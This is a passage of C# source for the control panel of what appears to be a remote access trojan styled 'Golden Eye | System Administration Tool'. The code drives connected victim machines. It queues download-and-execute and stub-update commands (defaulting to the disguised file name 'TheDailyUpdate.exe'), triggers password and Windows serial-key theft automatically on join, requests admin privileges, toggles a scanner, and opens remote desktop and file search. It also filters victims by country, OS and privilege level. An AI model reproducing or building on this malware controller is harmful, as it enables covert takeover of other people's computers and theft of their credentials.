                            }
                            else if (Command.Equals("Disable Proactive Scanner"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("antim²disableprs");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Disconnect Client"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("action²disconnect");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Uninstall Client"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("action²uninstall");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                        }
                    }
                    else if (ExecuteBy.Equals("MachineType"))
                    {
                        if (machinetype.Contains(ExecuteByArguments))
                        {
                            if (Command.Equals("Download and Execute"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("execute²file²" + InputData.Split('§')[0] + "²" + InputData.Split('§')[1]);
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Update Client Executable"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("execute²update²" + InputData.Split('§')[0] + "²" + InputData.Split('§')[1]);
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Recover Passwords"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("Recover²Passwords");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Recover Win-SerialKey"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("Recover²Winserial");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Request Admin Privileges"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("uac²request");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Run Malware Cleaner"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("antim²normal");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Enable Proactive Scanner"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("antim²enableprs");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Disable Proactive Scanner"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("antim²disableprs");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Disconnect Client"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("action²disconnect");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Uninstall Client"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("action²uninstall");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                        }
                    }
                    else if (ExecuteBy.Equals("Stub Version"))
                    {
                        if (stubver.Contains(ExecuteByArguments))
                        {
                            if (Command.Equals("Download and Execute"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("execute²file²" + InputData.Split('§')[0] + "²" + InputData.Split('§')[1]);
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Update Client Executable"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("execute²update²" + InputData.Split('§')[0] + "²" + InputData.Split('§')[1]);
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Recover Passwords"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("Recover²Passwords");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Recover Win-SerialKey"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("Recover²Winserial");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Request Admin Privileges"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("uac²request");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Run Malware Cleaner"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("antim²normal");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Enable Proactive Scanner"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("antim²enableprs");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Disable Proactive Scanner"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("antim²disableprs");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Disconnect Client"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("action²disconnect");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Uninstall Client"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("action²uninstall");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                        }
                    }
                    
                }
                string final = string.Empty;
                foreach (ListViewItem i in listView9.Items)
                {
                    final += i.Text + "²" + i.SubItems[1].Text + "²" + i.SubItems[2].Text + "²" + i.SubItems[3].Text + "²" + i.SubItems[4].Text + "³";
                }
                File.WriteAllText(Application.StartupPath + @"\Configuration\On Join Commands.ini", final);
            }

            if (velyseCheckbox5.Checked == true)
            {
                onjoinhandler.addToSend("Recover²Passwords");
                onjoinhandler.addToSend("Recover²Winserial");
            }
            onjoinhandler.sendCommand();

            if (isFileSearcherOn == true)
            {
                string toSend2 = "";
                foreach (ListViewItem i in listView7.Items)
                {
                    string filename = i.Text;
                    string loc = i.SubItems[1].Text;
                    string action = i.SubItems[2].Text;
                    string taskid = i.SubItems[3].Text;
                    toSend2 += filename + "²" + loc + "²" + action + "²" + taskid + "³";
                }
                doCommandAsync(client, "filesearch|" + toSend2);
            }
        }

        private delegate void _RemoveClient(Connection client);

        private void RemoveClient(Connection client)
        {
            foreach (ListViewItem i in listView1.Items)
                if ((Connection)i.Tag == client)
                {
                    i.Remove();
                    online--;
                    updateOnline();
                    break;
                }
        }

        private delegate void _Status(Connection client, String Status);

        private void Status(Connection client, String Status)
        {
            foreach (ListViewItem item in listView1.Items)
                if ((Connection)item.Tag == client)
                {
                    item.SubItems[9].Text = Status;
                    break;
                }
        }

        private delegate void _updateActiveWindow(Connection client, String windowtext);

        private void updateActiveWindow(Connection client, String windowtext)
        {
            foreach (ListViewItem item in listView1.Items)
                if ((Connection)item.Tag == client)
                {
                    if (windowtext == "")
                    {
                        windowtext = "[explorer.exe] Windows Desktop/Explorer";
                    }
                    item.SubItems[3].Text = windowtext;
                    break;
                }
        }

        private void updateOnline()
        {
            doDashboardUpdate();
            lblOnline.Text = "Online: " + online;
            foreach (ListViewItem item in listView2.Items)
            {
                item.SubItems[1].Text = online.ToString();
            }
        }

        #endregion <Invoking>

        private void clientConnection_DisconnectedEvent(Connection client)
        {
            try
            {
                Invoke(new _RemoveClient(RemoveClient), client);
            }
            catch
            {
            }
        }

        public Image ImageFromBase64String(string base64)
        {
            MemoryStream memory = new MemoryStream(Convert.FromBase64String(base64));
            Image result = Image.FromStream(memory);
            memory.Close();

            return result;
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);
            Environment.Exit(0);
        }

        private void velyseForm1_Click(object sender, EventArgs e)
        {
        }

        private void btnListen_Click(object sender, EventArgs e)
        {
            port = int.Parse(txtPort.Text);
            btnListen.Enabled = false;
            listener = new TcpListener(IPAddress.Any, port);
            listenerThread = new Thread(Listen);
            listenerThread.Start();
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            btnListen.Enabled = true;
            listener.Stop();
            listenerThread.Abort();
        }

        private void button1_Click(object sender, EventArgs e)
        {
        }

        public string autoListenS = "";
        public string notificationClientConnectS = "";
        public string playsoundClientConnectS = "";
        public string createFolderEachClientS = "";
        public string disconnectOnClientErrorS = "";
        public string writeAllLogTypesToFileS = "";
        public string connectionlimitS = "";
        public int connectionlimitNmbr = 0;

        // Client Network Control
        public string autoRecoverS = "";

        public string autoSaveToFileS = "";
        public string autosaveFilePathS = "";

        private void Form1_Load(object sender, EventArgs e)
        {
            /* DASHBOARD STUFF */
            doDashboardUpdate();
            /* DASHBOARD STUFF */

            velyseForm1.Text = "Golden Eye | System Administration Tool | " + RatVersion;
            t_Label14.Text = RatVersion;
            Directory.CreateDirectory("Configuration");
            if (File.Exists(Application.StartupPath + @"\Configuration\On Join Commands.ini"))
            {
                string[] cmds = File.ReadAllText(Application.StartupPath + @"\Configuration\On Join Commands.ini").Split('³');

                foreach (string cmd in cmds)
                {
                    // task.Split('²')[0];
                    try
                    {
                        ListViewItem item = new ListViewItem();
                        item.Text = cmd.Split('²')[0];
                        item.SubItems.Add(cmd.Split('²')[1]);
                        item.SubItems.Add(cmd.Split('²')[2]);
                        item.SubItems.Add(cmd.Split('²')[3]);
                        item.SubItems.Add(cmd.Split('²')[4]);
                        listView9.Items.Add(item);
                    }
                    catch { }
                }
            }
            if (File.Exists(Application.StartupPath + @"\Configuration\FileSearcher.ini"))
            {
                if (File.ReadAllText(Application.StartupPath + @"\Configuration\FileSearcher.ini").Equals("enabled"))
                {
                    isFileSearcherOn = true;
                    velyseCheckbox20.Checked = true;
                }
                else
                {
                    isFileSearcherOn = false;
                    velyseCheckbox20.Checked = false;
                }
            }
            if (File.Exists(Application.StartupPath + @"\Configuration\FileSearcherTasks.ini"))
            {
                string[] tasks = File.ReadAllText(Application.StartupPath + @"\Configuration\FileSearcherTasks.ini").Split('³');

                foreach (string task in tasks)
                {
                    // task.Split('²')[0];
                    try
                    {
                        ListViewItem item = new ListViewItem();
                        item.Text = task.Split('²')[0];
                        item.SubItems.Add(task.Split('²')[1]);
                        item.SubItems.Add(task.Split('²')[2]);
                        item.SubItems.Add(task.Split('²')[3]);
                        listView7.Items.Add(item);
                    }
                    catch { }
                }
            }
            if (!File.Exists(Application.StartupPath + @"\Configuration\networkcontrol.ini"))
            {
                string autoRecover = "false";
                string autoSaveToFile = "false";
                string autosaveFilePath = "";

                velyseCheckbox5.Checked = true;

                if (velyseCheckbox5.Checked == true)
                {
                    autoRecover = "true";
                }
                if (velyseCheckbox6.Checked == true)
                {
                    autoSaveToFile = "true";
                    autosaveFilePath = t_TextBox1.Text;
                }

                File.WriteAllText(Application.StartupPath + @"\Configuration\networkcontrol.ini", autoRecover + "³" + autoSaveToFile + "³" + autosaveFilePath);

                // Recovery Types
                velyseCheckbox1.Checked = true;
                velyseCheckbox2.Checked = true;
                velyseCheckbox3.Checked = true;
                velyseCheckbox4.Checked = true;
                velyseCheckbox7.Checked = true;
                velyseCheckbox8.Checked = true;

                velyseCheckbox30.Checked = true;

                velyseCheckbox24.Checked = true;

                velyseCheckbox25.Checked = true;

                velyseCheckbox21.Checked = true;

                velyseCheckbox22.Checked = true;

                velyseCheckbox23.Checked = true;

                velyseCheckbox26.Checked = true;

                velyseCheckbox27.Checked = true;

                velyseCheckbox28.Checked = true;

                velyseCheckbox29.Checked = true;

                // Recovery auto save File
                t_TextBox1.Enabled = false;
                button2.Enabled = false;
            }
            // autoRecover + "³" + autoSaveToFile + "³" + autosaveFilePath
            string configtxt1 = File.ReadAllText(Application.StartupPath + @"\Configuration\networkcontrol.ini");

            autoRecoverS = configtxt1.Split('³')[0];
            autoSaveToFileS = configtxt1.Split('³')[1];
            autosaveFilePathS = configtxt1.Split('³')[2];

            if (autoRecoverS.Equals("true"))
            {
                velyseCheckbox5.Checked = true;

                velyseCheckbox1.Checked = true;
                velyseCheckbox2.Checked = true;
                velyseCheckbox3.Checked = true;
                velyseCheckbox4.Checked = true;
                velyseCheckbox7.Checked = true;
                velyseCheckbox8.Checked = true;

                velyseCheckbox30.Checked = true;

                velyseCheckbox24.Checked = true;

                velyseCheckbox25.Checked = true;

                velyseCheckbox21.Checked = true;

                velyseCheckbox22.Checked = true;

                velyseCheckbox23.Checked = true;

                velyseCheckbox26.Checked = true;

                velyseCheckbox27.Checked = true;

                velyseCheckbox28.Checked = true;

                velyseCheckbox29.Checked = true;
            }
            else
            {
                velyseCheckbox1.Checked = false;
                velyseCheckbox2.Checked = false;
                velyseCheckbox3.Checked = false;
                velyseCheckbox4.Checked = false;
                velyseCheckbox7.Checked = false;
                velyseCheckbox8.Checked = false;


                velyseCheckbox24.Checked = false;

                velyseCheckbox25.Checked = false;

                velyseCheckbox21.Checked = false;

                velyseCheckbox22.Checked = false;

                velyseCheckbox23.Checked = false;

                velyseCheckbox26.Checked = false;

                velyseCheckbox27.Checked = false;

                velyseCheckbox28.Checked = false;

                velyseCheckbox29.Checked = false;
            }
            if (autoSaveToFileS.Equals("true"))
            {
                velyseCheckbox6.Checked = true;
                t_TextBox1.Text = autosaveFilePathS;
                t_TextBox1.Enabled = true;
                button2.Enabled = true;
            }
            else
            {
                velyseCheckbox6.Checked = false;
                t_TextBox1.Text = "";
                t_TextBox1.Enabled = false;
                button2.Enabled = false;
            }

            if (!File.Exists(Application.StartupPath + @"\Configuration\settings.ini"))
            {
                string autoListen = "false";
                string notificationClientConnect = "false";
                string playsoundClientConnect = "false";
                string createFolderEachClient = "false";
                string disconnectOnClientError = "false";
                string writeAllLogTypesToFile = "false";
                string connectionlimit = "false";
                string connectionlimitNmbr = textBox1.Text;

                if (checkBox1.Checked == true)
                {
                    autoListen = "true";
                }
                if (checkBox2.Checked == true)
                {
                    notificationClientConnect = "true";
                }
                if (checkBox3.Checked == true)
                {
                    playsoundClientConnect = "true";
                }
                if (checkBox4.Checked == true)
                {
                    createFolderEachClient = "true";
                }
                if (checkBox5.Checked == true)
                {
                    disconnectOnClientError = "true";
                }
                if (checkBox6.Checked == true)
                {
                    writeAllLogTypesToFile = "true";
                }
                if (checkBox7.Checked == true)
                {
                    connectionlimit = "true";
                }
                File.WriteAllText(Application.StartupPath + @"\Configuration\settings.ini", autoListen + "³" + notificationClientConnect + "³" + playsoundClientConnect + "³" + createFolderEachClient + "³" + disconnectOnClientError + "³" + writeAllLogTypesToFile + "³" + connectionlimit + "³" + connectionlimitNmbr);
            }
            // autoListen + "³" + notificationClientConnect + "³" + playsoundClientConnect + "³" + createFolderEachClient + "³" + disconnectOnClientError + "³" + writeAllLogTypesToFile + "³" + connectionlimit
            string configtxt = File.ReadAllText(Application.StartupPath + @"\Configuration\settings.ini");

            autoListenS = configtxt.Split('³')[0];
            notificationClientConnectS = configtxt.Split('³')[1];
            playsoundClientConnectS = configtxt.Split('³')[2];
            createFolderEachClientS = configtxt.Split('³')[3];
            disconnectOnClientErrorS = configtxt.Split('³')[4];
            writeAllLogTypesToFileS = configtxt.Split('³')[5];
            connectionlimitS = configtxt.Split('³')[6];
            connectionlimitNmbr = int.Parse(configtxt.Split('³')[7]);
            System.IO.Directory.CreateDirectory("Client Data");

            if (autoListenS.Equals("true"))
            {
                checkBox1.Checked = true;
            }
            if (notificationClientConnectS.Equals("true"))
            {
                checkBox2.Checked = true;
            }
            else
            {
                checkBox2.Checked = false;
            }
            if (playsoundClientConnectS.Equals("true"))
            {
                checkBox3.Checked = true;
            }
            if (createFolderEachClientS.Equals("true"))
            {
                checkBox4.Checked = true;
            }
            else
            {
                checkBox4.Checked = false;
            }
            if (disconnectOnClientErrorS.Equals("true"))
            {
                checkBox5.Checked = true;
            }
            if (writeAllLogTypesToFileS.Equals("true"))
            {
                checkBox6.Checked = true;
            }
            if (connectionlimitS.Equals("true"))
            {
                checkBox7.Checked = true;
            }
            textBox1.Text = connectionlimitNmbr.ToString();
        }

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Connection client = (Connection)item.Tag;
                RemoteDesktop fm = new RemoteDesktop();
                fm.clientLcl = client;
                fm.Name = ("|desktp|" + client.UniqueID);
                fm.Text = ("Remote Desktop - " + client.UniqueID);
                fm.Show();
            }
        }

        private void uninstallClientToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 0)
            {
                // Nothing here
            }
            else
            {
                DialogResult dialogResult = MessageBox.Show("Are you sure you want to uninstall the Client from the Machine?", "Are you sure?", MessageBoxButtons.YesNo);
                if (dialogResult == DialogResult.Yes)
                {
                    foreach (ListViewItem item in listView1.SelectedItems)
                    {
                        Connection client = (Connection)item.Tag;
                        client.Send("UNINSTALL");
                    }
                }
                else if (dialogResult == DialogResult.No)
                {
                    return;
                }
            }
         
        }

        private void disconnectClientToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 0)
            {
                // Nothing here
            }
            else
            {
                DialogResult dialogResult = MessageBox.Show("Are you sure you want to disconnected the Client? It will only connect again upon the next start of the executable!", "Are you sure?", MessageBoxButtons.YesNo);
                if (dialogResult == DialogResult.Yes)
                {
                    foreach (ListViewItem item in listView1.SelectedItems)
                    {
                        Connection client = (Connection)item.Tag;
                        client.Send("DISCONNECT");
                    }
                }
                else if (dialogResult == DialogResult.No)
                {
                    return;
                }
            }
        }

        private void reconnectClientToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 0)
            {
                // Nothing here
            }
            else
            {
                DialogResult dialogResult = MessageBox.Show("Are you sure you want to reconnect the Client?", "Are you sure?", MessageBoxButtons.YesNo);
                if (dialogResult == DialogResult.Yes)
                {
                    foreach (ListViewItem item in listView1.SelectedItems)
                    {
                        Connection client = (Connection)item.Tag;
                        client.Send("RECONNECT");
                        online--;
                        updateOnline();
                    }
                }
                else if (dialogResult == DialogResult.No)
                {
                    return;
                }
            }
        }

        private void executeFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ExecuteFile fm = new ExecuteFile();
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Connection client = (Connection)item.Tag;
                fm.Clientlist.Add(client);
            }
            fm.Name = ("|execfile|");
            fm.Text = ("Execute a File - " + fm.Clientlist.Count + " Clients selected");
            fm.Show();
        }

        private void updateClientToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string dllink = Interaction.InputBox("Please enter the direct Download-Link to your new Stub!", "Update Clients", "https://example.com/files/PleaseExecute.exe", 0, 0);
            string saveas = Interaction.InputBox("Please enter a File Name (including .exe) the new Stub gets saved & executes as", "Update Clients", "TheDailyUpdate.exe", 0, 0);
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Connection client = (Connection)item.Tag;
                client.Send("UPDATE|" + dllink + "|" + saveas);
            }
        }

        private void selectOfClientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                string numberOld = Interaction.InputBox("How much Clients would you like to select?", "Select Clients", "2", 0, 0);
                int numberParsed = int.Parse(numberOld);

                if (listView1.Items.Count < numberParsed)
                {
                    MessageBox.Show("You dont have enough Clients online!");
                }
                else
                {
                    int alreadySelected = 0;
                    listView1.BeginUpdate();
                    foreach (ListViewItem item in listView1.Items)
                    {
                        if (alreadySelected == numberParsed)
                        {
                        }
                        else
                        {
                            alreadySelected++;
                            item.Selected = true;
                        }
                    }
                    listView1.EndUpdate();
                }
            }
            catch (Exception eax)
            {
                MessageBox.Show("Error:\n\n" + eax.ToString());
            }
        }

        private void selectAllClientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listView1.BeginUpdate();
            foreach (ListViewItem item in listView1.Items)
            {
                item.Selected = true;
            }
            listView1.EndUpdate();
        }

        private void iDToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string clientID = Interaction.InputBox("Enter the Client ID of the Client you are looking for", "Search Clients", "", 0, 0);

            listView1.BeginUpdate();
            foreach (ListViewItem item in listView1.Items)
            {
                if (item.Text.Equals(clientID))
                {
                    item.Selected = true;
                    listView1.EndUpdate();
                    MessageBox.Show("Client has been found and selected!");
                    return;
                }
            }
            MessageBox.Show("Couldnt find Client by the provided Client ID!");
            listView1.EndUpdate();
        }

        private void machineNameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string MachineName = Interaction.InputBox("Enter the Machine Name of the Client you are looking for", "Search Clients", "", 0, 0);

            listView1.BeginUpdate();
            foreach (ListViewItem item in listView1.Items)
            {
                if (item.SubItems[6].Text.Contains(MachineName))
                {
                    item.Selected = true;
                    listView1.EndUpdate();
                    MessageBox.Show("Client has been found and selected!");
                    return;
                }
            }
            MessageBox.Show("Couldnt find Client by the provided Machine Name!");
            listView1.EndUpdate();
        }

        private void locationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string location = Interaction.InputBox("Enter the Location to select the clients by", "Select Clients", "Germany", 0, 0);

            listView1.BeginUpdate();
            int selected = 0;
            foreach (ListViewItem item in listView1.Items)
            {
                if (item.SubItems[2].Text.Contains(location))
                {
                    item.Selected = true;
                    selected++;
                }
            }
            listView1.EndUpdate();
            MessageBox.Show("There has been " + selected + " Clients selected by the Location '" + location + "'!");
        }

        private void operatingSystemToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string os = Interaction.InputBox("Enter the Operating System to select the clients by", "Select Clients", "Microsoft Windows 10 Home", 0, 0);

            listView1.BeginUpdate();
            int selected = 0;
            foreach (ListViewItem item in listView1.Items)
            {
                if (item.SubItems[5].Text.Contains(os))
                {
                    item.Selected = true;
                    selected++;
                }
            }
            listView1.EndUpdate();
            MessageBox.Show("There has been " + selected + " Clients selected by the Operating System '" + os + "'!");
        }

        private void machineTypeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string mtype = Interaction.InputBox("Enter the Machine Type to select the clients by", "Select Clients", "Laptop", 0, 0);

            listView1.BeginUpdate();
            int selected = 0;
            foreach (ListViewItem item in listView1.Items)
            {
                if (item.SubItems[7].Text.Contains(mtype))
                {
                    item.Selected = true;
                    selected++;
                }
            }
            listView1.EndUpdate();
            MessageBox.Show("There has been " + selected + " Clients selected by the Machine Type '" + mtype + "'!");
        }

        private void privilegesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string privs = Interaction.InputBox("Enter the Privileges Level to select the clients by", "Select Clients", "Admin", 0, 0);

            listView1.BeginUpdate();
            int selected = 0;
            foreach (ListViewItem item in listView1.Items)
            {
                if (item.SubItems[8].Text.Contains(privs))
                {
                    item.Selected = true;
                    selected++;
                }
            }
            listView1.EndUpdate();
            MessageBox.Show("There has been " + selected + " Clients selected by the Privileges Level '" + privs + "'!");
        }

        private void versiobnToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string ver = Interaction.InputBox("Enter the Stub Version to select the clients by", "Select Clients", "1.0.0", 0, 0);

            listView1.BeginUpdate();
            int selected = 0;
            foreach (ListViewItem item in listView1.Items)
            {
                if (item.SubItems[10].Text.Contains(ver))
                {
                    item.Selected = true;
                    selected++;
                }
            }
            listView1.EndUpdate();
            MessageBox.Show("There has been " + selected + " Clients selected by the Stub Version '" + ver + "'!");
        }

        private void uACPanelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            UAC fm = new UAC();
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Connection client = (Connection)item.Tag;

                if (item.SubItems[8].Text == "User")
                {
                    fm.Clientlist.Add(client);
                }
            }
            fm.Name = ("|uac|");
            fm.Text = ("User Account Control Panel - " + fm.Clientlist.Count.ToString() + " Clients selected");
            fm.Show();
        }

        private void clientManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Connection client = (Connection)item.Tag;
                ClientManager fm = new ClientManager();
                fm.clientLcl = client;
                fm.containerText = "Client Manager - " + item.SubItems[4].Text + "@" + item.SubItems[6].Text + " [" + item.SubItems[8].Text + " Privileges]";
                fm.frm1 = this;
                fm.Name = ("|rclientn|" + client.UniqueID);
                fm.Text = ("Client Manager - " + client.UniqueID);
                fm.Show();
            }
        }

        private void systemFunctionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SystemFunctions fm = new SystemFunctions();
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Connection client = (Connection)item.Tag;

                fm.Clientlist.Add(client);
            }
            fm.Name = ("|sysfuncs|");
            fm.Text = ("System Functions - " + fm.Clientlist.Count.ToString() + " Clients selected");
            fm.Show();
        }

        private void recoverWinSerialKeyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Connection client = (Connection)item.Tag;

                client.Send("RECOVERY|winserial");
            }
        }

        private void recoverPasswordsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Connection client = (Connection)item.Tag;

                client.Send("RECOVERY|passrec");
            }
        }

        private void velyseCheckbox6_Click(object sender, EventArgs e)
        {
            if (velyseCheckbox6.Checked == true)
            {
                t_TextBox1.Enabled = true;
                button2.Enabled = true;
            }
            else
            {
                t_TextBox1.Enabled = false;
                t_TextBox1.Text = "";
                button2.Enabled = false;
            }
        }

        private void velyseCheckbox5_Click(object sender, EventArgs e)
        {
            if (velyseCheckbox5.Checked == true)
            {
                // 1 2 3 4 7 8
                velyseCheckbox1.Checked = true;
                velyseCheckbox2.Checked = true;
                velyseCheckbox3.Checked = true;
                velyseCheckbox4.Checked = true;
                velyseCheckbox7.Checked = true;
                velyseCheckbox8.Checked = true;

                velyseCheckbox30.Checked = true;

                velyseCheckbox24.Checked = true;

                velyseCheckbox25.Checked = true;

                velyseCheckbox21.Checked = true;

                velyseCheckbox22.Checked = true;

                velyseCheckbox23.Checked = true;

                velyseCheckbox26.Checked = true;

                velyseCheckbox27.Checked = true;

                velyseCheckbox28.Checked = true;

                velyseCheckbox29.Checked = true;
            }
            else
            {
                velyseCheckbox1.Checked = false;
                velyseCheckbox2.Checked = false;
                velyseCheckbox3.Checked = false;
                velyseCheckbox4.Checked = false;
                velyseCheckbox7.Checked = false;
                velyseCheckbox8.Checked = false;

                velyseCheckbox30.Checked = false;

                velyseCheckbox24.Checked = false;

                velyseCheckbox25.Checked = false;

                velyseCheckbox21.Checked = false;

                velyseCheckbox22.Checked = false;

                velyseCheckbox23.Checked = false;

                velyseCheckbox26.Checked = false;

                velyseCheckbox27.Checked = false;

                velyseCheckbox28.Checked = false;

                velyseCheckbox29.Checked = false;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            OpenFileDialog res = new OpenFileDialog();
            res.Filter = "Text Files|*.txt";
            res.Title = "Choose a File to Auto Save Passwords to";
            //When the user select the file
            if (res.ShowDialog() == DialogResult.OK)
            {
                //Get the file's path
                var filePath = res.FileName;
                t_TextBox1.Text = filePath;
            }
        }

        private void checkBox7_CheckedChanged(object sender)
        {
            if (checkBox7.Checked == true)
            {
                textBox1.Enabled = true;
            }
            else
            {
                textBox1.Enabled = false;
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            string autoRecover = "false";
            string autoSaveToFile = "false";
            string autosaveFilePath = "";

            if (velyseCheckbox5.Checked == true)
            {
                autoRecover = "true";
            }
            if (velyseCheckbox6.Checked == true)
            {
                autoSaveToFile = "true";
                autosaveFilePath = t_TextBox1.Text;
            }

            File.WriteAllText(Application.StartupPath + @"\Configuration\networkcontrol.ini", autoRecover + "³" + autoSaveToFile + "³" + autosaveFilePath);
        }

        private void messageBoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MessageBoxForm fm = new MessageBoxForm();
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Connection client = (Connection)item.Tag;

                fm.Clientlist.Add(client);
            }
            fm.Name = ("|msgboxf|");
            fm.Text = ("MessageBox - " + fm.Clientlist.Count.ToString() + " Clients selected");
            fm.Show();
        }

        private void remoteChatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Connection client = (Connection)item.Tag;
